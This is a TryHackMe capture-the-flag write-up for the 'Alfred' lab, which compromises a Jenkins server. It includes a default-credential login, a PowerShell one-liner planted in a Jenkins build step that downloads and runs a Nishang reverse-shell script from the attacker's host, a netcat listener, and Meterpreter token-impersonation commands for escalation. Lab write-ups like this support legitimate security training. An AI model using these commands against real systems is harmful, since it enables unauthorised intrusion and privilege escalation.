---
title: "TryHackMe - Alfred"
description: "Exploit misconfiguration on Jenkins server to gain access to the system and escalate privileges."
date: "2023-04-18"
headerImage: "https://raw.githubusercontent.com/hhphu/images/main/THM%20-%20Alfred/alfred-header.png"
tags: ["TryHackMe"]
---

---

- **Title:** Alfred
- **Description:** In this room, we'll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made change to it). After which, we'll use an interesting privilege escalation method to get full system access.

---

### Initial Access
- Run nmap against the IP to explore the ports and services and output to a file named 10.10.1.114-nmap-scan

```bash
	nmap -A -Pn $IP >> $IP-nmap-scan
```

![nmap-scan.png](https://raw.githubusercontent.com/hhphu/images/main/THM%20-%20Alfred/nmap-scan.png)

- As the nmap scan shows, Jenskin is running on port 8080 of this target machine. 

![jenskin.png](https://raw.githubusercontent.com/hhphu/images/main/THM%20-%20Alfred/jenskin.png)

Trying default credentials admin || admin, I was able to log in. Once logged, I could see that there was only 1 project named "project". Clicking the link took me to the following page.

![project-dashboard](https://raw.githubusercontent.com/hhphu/images/main/THM%20-%20Alfred/project-dashboard.png)

- Exploring the cofiguration of the project, I saw that everytime the job is run, Windows batch commands were executed.

![build-configuration](https://raw.githubusercontent.com/hhphu/images/main/THM%20-%20Alfred/build-configuration.png)

* Now I need to delliver a payload and get a reverse shell through this configuration. According to the instuctions of TryHackMe, we need to download the [Invoke-PowerShellTcp.ps1]("https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1") to our attacking machine. From the directory where the file is located, create a server:

```bash
python -m http.server 8000
```

In the "Execute Windows batch command" from Jenskin, paste the follow command:

```shell
powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port

```

- Save the configuration. 

- On attacking machine, run a netcat listener:  

```bash 
nc -lnvp 5555
```

- On Jenskin, click "Build Now" link to start the project. Now we'll get a reverse shell:

![reverse-shell](https://raw.githubusercontent.com/hhphu/images/main/THM%20-%20Alfred/reverse-shell.png)

Poking around the target machine, we can easily find the user flag:

![user-text-flag](https://raw.githubusercontent.com/hhphu/images/main/THM%20-%20Alfred/user-text-flag.png)

Following instruction on TryHackMe, we can easily switch to a more stable shell.

![stable-shell](https://raw.githubusercontent.com/hhphu/images/main/THM%20-%20Alfred/stable-shell.png)

### Privilege Escalation

- Run ```list_tokens -g```  to check which token is available

![list-tokens](https://raw.githubusercontent.com/hhphu/images/main/THM%20-%20Alfred/list-tokens.png)

- Run ```impersonate_token "BUILTIN\Administrators"```. Then run ```
getuid``` , we get the following result:

![impersonate-tokens](https://raw.githubusercontent.com/hhphu/images/main/THM%20-%20Alfred/impersonate-token.png)

- Running ```ps``` command, we'll learn PID of services.exe is 668. Migrate the process to elevate prilvilege:

```shell
migrate 668
```

![migrate-services](https://raw.githubusercontent.com/hhphu/images/main/THM%20-%20Alfred/migrate-services.png)
- Now we can view root.txt

